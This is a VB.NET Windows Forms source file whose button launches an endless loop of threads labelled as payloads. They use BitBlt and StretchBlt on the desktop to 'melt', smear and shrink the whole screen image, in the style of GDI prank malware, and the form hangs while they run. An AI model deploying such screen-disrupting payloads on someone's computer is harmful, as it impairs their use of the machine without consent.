Imports System.Runtime.InteropServices
Imports System.Threading

Public Class Form1

    <DllImport("gdi32.dll", SetLastError:=True)>
    Private Shared Function BitBlt(hdcDest As IntPtr, nXDest As Integer, nYDest As Integer, nWidth As Integer, nHeight As Integer, hdcSrc As IntPtr, nXSrc As Integer, nYSrc As Integer, dwRop As UInteger) As Boolean
    End Function

    <DllImport("user32.dll", SetLastError:=True)>
    Private Shared Function GetDC(hWnd As IntPtr) As IntPtr
    End Function

    <DllImport("user32.dll", SetLastError:=True)>
    Private Shared Function GetSystemMetrics(nIndex As Integer) As Integer
    End Function

    <DllImport("user32.dll", SetLastError:=True)>
    Private Shared Function ReleaseDC(hWnd As IntPtr, hDC As IntPtr) As Boolean
    End Function

    <DllImport("user32.dll", SetLastError:=True)>
    Private Shared Function GetDesktopWindow() As IntPtr
    End Function

    <DllImport("user32.dll", SetLastError:=True)>
    Private Shared Function GetWindowDC(hWnd As IntPtr) As IntPtr
    End Function

    <DllImport("gdi32.dll", SetLastError:=True)>
    Private Shared Function StretchBlt(hdcDest As IntPtr, nXOriginDest As Integer, nYOriginDest As Integer, nWidthDest As Integer, nHeightDest As Integer, hdcSrc As IntPtr, nXOriginSrc As Integer, nYOriginSrc As Integer, nWidthSrc As Integer, nHeightSrc As Integer, dwRop As UInteger) As Boolean
    End Function

    <DllImport("user32.dll", SetLastError:=True)>
    Private Shared Function GetWindowRect(hWnd As IntPtr, ByRef lpRect As RECT) As Boolean
    End Function

    <StructLayout(LayoutKind.Sequential)>
    Private Structure RECT
        Public Left As Integer
        Public Top As Integer
        Public Right As Integer
        Public Bottom As Integer
    End Structure

    Const SRCCOPY As UInteger = &HCC0020 'hack(?)

    Dim rand As New Random()

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        While True

            Dim ThreadMelter As New Thread(AddressOf Melter)
            ThreadMelter.Start()
            Thread.Sleep(100)

            Dim ThreadMelter2 As New Thread(AddressOf Melter2)
            ThreadMelter2.Start()
            Thread.Sleep(100)

            Dim threadpip1 As New Thread(AddressOf PayloadPIP1)
            threadpip1.Start()
            Thread.Sleep(100)

            Dim threadpip2 As New Thread(AddressOf PayloadPIP2)
            threadpip2.Start()
            Thread.Sleep(100)

            Dim threadpip3 As New Thread(AddressOf PayloadPIP3)
            threadpip3.Start()
            Thread.Sleep(100)

            ThreadMelter.Abort()
            ThreadMelter2.Abort()
            threadpip1.Abort()
            threadpip2.Abort()
            threadpip3.Abort()
        End While
    End Sub

    Public Function Melter()
        Dim screenWidth As Integer = GetSystemMetrics(0)
        Dim screenHeight As Integer = GetSystemMetrics(1)
        Dim hdc As IntPtr = GetDC(IntPtr.Zero)

        Try
            While True
                Dim xs As Integer = rand.Next(screenWidth)
                Dim ys As Integer = rand.Next(screenHeight)
                Dim sel As Integer = rand.Next(1, 5)
                Dim size As Integer = rand.Next(30) + 20
                Dim rnd As Integer = rand.Next(50) + 30
                Dim thing As Integer = rand.Next(5, 30)

                Select Case sel
                    Case 1
                        For i As Integer = 0 To rnd Step thing
                            BitBlt(hdc, xs + i, ys + i, size + xs, size + ys, hdc, xs, ys, SRCCOPY)
                        Next
                    Case 2
                        For i As Integer = 0 To rnd Step thing
                            BitBlt(hdc, xs + i, ys - i, size + xs, size - ys, hdc, xs, ys, SRCCOPY)
                        Next
                    Case 3
                        For i As Integer = 0 To rnd Step thing
                            BitBlt(hdc, xs - i, ys + i, size - xs, size - ys, hdc, xs, ys, SRCCOPY)
                        Next
                    Case 4
                        For i As Integer = 0 To rnd Step thing
                            BitBlt(hdc, xs - i, ys - i, size - xs, size + ys, hdc, xs, ys, SRCCOPY)
                        Next
                End Select
            End While
        Finally
            ReleaseDC(IntPtr.Zero, hdc)
        End Try
    End Function

    Public Function Melter2()
        Dim screenWidth As Integer = GetSystemMetrics(0)
        Dim screenHeight As Integer = GetSystemMetrics(1)
        Dim hdc As IntPtr = GetDC(IntPtr.Zero)

        Try
            While True
                Dim xs As Integer = rand.Next(screenWidth)
                Dim ys As Integer = rand.Next(screenHeight)
                Dim sel As Integer = rand.Next(1, 5)
                Dim size As Integer = rand.Next(50) + 40
                Dim rnd As Integer = rand.Next(50) + 30
                Dim thing As Integer = rand.Next(5, 30)

                Select Case sel
                    Case 1
                        For i As Integer = 0 To rnd Step thing
                            BitBlt(hdc, xs + (Math.Sin(i) * thing * thing), ys + (Math.Cos(i) * thing * thing), size + xs, size + ys, hdc, xs, ys, SRCCOPY)
                        Next
                    Case 2
                        For i As Integer = 0 To rnd Step thing
                            BitBlt(hdc, xs + (Math.Sin(i) * thing * thing), ys - (Math.Cos(i) * thing * thing), size + xs, size - ys, hdc, xs, ys, SRCCOPY)
                        Next
                    Case 3
                        For i As Integer = 0 To rnd Step thing
                            BitBlt(hdc, xs - (Math.Sin(i) * thing * thing), ys + (Math.Cos(i) * thing * thing), size - xs, size - ys, hdc, xs, ys, SRCCOPY)
                        Next
                    Case 4
                        For i As Integer = 0 To rnd Step thing
                            BitBlt(hdc, xs - (Math.Sin(i) * thing * thing), ys - (Math.Cos(i) * thing * thing), size - xs, size + ys, hdc, xs, ys, SRCCOPY)
                        Next
                End Select
            End While
        Finally
            ReleaseDC(IntPtr.Zero, hdc)
        End Try
    End Function

    Public Function PayloadPIP1()
        Dim hwnd As IntPtr = GetDesktopWindow()
        Dim hdc As IntPtr = GetWindowDC(hwnd)

        Dim rekt As RECT
        GetWindowRect(hwnd, rekt)

        For i As Integer = 0 To 1000 - 1
            StretchBlt(hdc, 50, 50, rekt.Right - 100, rekt.Bottom - 100, hdc, 0, 0, rekt.Right, rekt.Bottom, SRCCOPY)
        Next

        ReleaseDC(hwnd, hdc)

    End Function

    Public Function PayloadPIP2()
        Dim hwnd As IntPtr = GetDesktopWindow()
        Dim hdc As IntPtr = GetWindowDC(hwnd)

        Dim rekt As RECT
        GetWindowRect(hwnd, rekt)

        For i As Integer = 0 To 1000 - 1
            StretchBlt(hdc, 50, 50, rekt.Right - i, rekt.Bottom - i, hdc, 0, 0, rekt.Right, rekt.Bottom, SRCCOPY)
        Next

        ReleaseDC(hwnd, hdc)

    End Function

    Public Function PayloadPIP3()
        Dim hwnd As IntPtr = GetDesktopWindow()
        Dim hdc As IntPtr = GetWindowDC(hwnd)

        Dim rekt As RECT
        GetWindowRect(hwnd, rekt)

        For i As Integer = 0 To 1000 - 1
            StretchBlt(hdc, 50, 50, rekt.Right - (Math.Sin(i / 10) * 100), rekt.Bottom - (Math.Sin(i / 100) * 100), hdc, 0, 0, rekt.Right, rekt.Bottom, SRCCOPY)
        Next

        ReleaseDC(hwnd, hdc)

    End Function

End Class